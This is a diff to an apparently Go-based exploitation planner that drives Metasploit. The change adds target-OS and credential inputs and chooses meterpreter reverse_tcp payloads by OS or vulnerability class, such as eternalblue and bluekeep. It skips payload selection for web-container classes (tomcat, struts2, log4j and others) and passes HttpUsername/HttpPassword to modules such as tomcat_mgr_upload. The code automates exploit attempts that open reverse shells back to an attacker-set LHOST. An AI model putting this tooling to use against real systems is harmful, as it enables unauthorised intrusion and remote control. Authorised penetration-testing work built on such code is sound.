@@ -43,6 +43,13 @@ type Input struct {
 	SSL       *bool  `json:"ssl,omitempty"`
 	LHOST     string `json:"lhost,omitempty"`
 	LPORT     int    `json:"lport,omitempty"`
+	// OS 目标操作系统（windows/linux/auto）：决定原生 exploit 的 PAYLOAD 家族。
+	// 不填时 auto=按漏洞类别推断（历史行为）。
+	OS string `json:"os,omitempty"`
+	// Username/Password 用于需要凭据的模块（如 tomcat_mgr_upload 的
+	// HttpUsername/HttpPassword）。为空时不写该选项。
+	Username string `json:"username,omitempty"`
+	Password string `json:"password,omitempty"`
 }
 
 // Candidate is one deterministic exploit attempt.
@@ -140,8 +147,15 @@ func NormalizeClass(s string) string {
 	return ""
 }
 
-// defaultReversePayload picks the payload family for the target OS implied by class.
-func defaultReversePayload(class string) string {
+// defaultReversePayload picks the payload family for the target OS implied by
+// class, honouring an explicit in.OS when the caller knows the target platform.
+func defaultReversePayload(class, os string) string {
+	switch strings.ToLower(strings.TrimSpace(os)) {
+	case "windows", "win":
+		return "windows/x64/meterpreter/reverse_tcp"
+	case "linux":
+		return "linux/x64/meterpreter/reverse_tcp"
+	}
 	switch class {
 	case "eternalblue", "bluekeep", "smb", "rdp", "mssql":
 		return "windows/x64/meterpreter/reverse_tcp"
@@ -150,6 +164,16 @@ func defaultReversePayload(class string) string {
 	default:
 		return "linux/x64/meterpreter/reverse_tcp"
 	}
+}
+
+// webPayloadClasses 是一组由 Web 容器/JSP 承载的利用面。它们的模块自带与
+// 目标类型匹配的默认 PAYLOAD（如 cmd/windows/reverse_powershell、
+// java/jsp_shell_reverse_tcp），外部硬塞 meterpreter 反而会因不兼容直接失败。
+// 因此这些类别不写 PAYLOAD，交给 Metasploit 按 target 选择。
+var webPayloadClasses = map[string]bool{
+	"tomcat": true, "jenkins": true, "struts2": true, "weblogic": true,
+	"shiro": true, "spring": true, "confluence": true, "gitlab": true,
+	"activemq": true, "solr": true, "log4j": true,
 }
 
 // cand is the static catalog shape; options are completed at Build time.
@@ -307,7 +331,12 @@ func Build(in Input) (Plan, error) {
 		}
 		payload := e.payload
 		if payload == "" && e.moduleType == "exploit" {
-			payload = defaultReversePayload(class)
+			if webPayloadClasses[class] {
+				// Web 载体模块自带兼容 payload，硬塞会不兼容。
+				payload = ""
+			} else {
+				payload = defaultReversePayload(class, in.OS)
+			}
 		}
 		if payload != "" {
 			opts["PAYLOAD"] = payload
@@ -421,6 +450,13 @@ func baseOptions(in Input) map[string]string {
 	if in.LHOST != "" {
 		opts["LHOST"] = in.LHOST
 	}
+	// 凭据类模块（tomcat_mgr_upload 等）的选项名是 HttpUsername/HttpPassword。
+	if in.Username != "" {
+		opts["HttpUsername"] = in.Username
+	}
+	if in.Password != "" {
+		opts["HttpPassword"] = in.Password
+	}
 	return opts
 }
 
@@ -463,6 +499,10 @@ func planID(class string, in Input, cands []Candidate) string {
 	b.WriteString(strconv.Itoa(portOf(in)))
 	b.WriteString("|")
 	b.WriteString(in.LHOST)
+	b.WriteString("|")
+	b.WriteString(strings.ToLower(strings.TrimSpace(in.OS)))
+	b.WriteString("|")
+	b.WriteString(in.Username)
 	for _, c := range cands {
 		b.WriteString("|")
 		b.WriteString(c.Module)
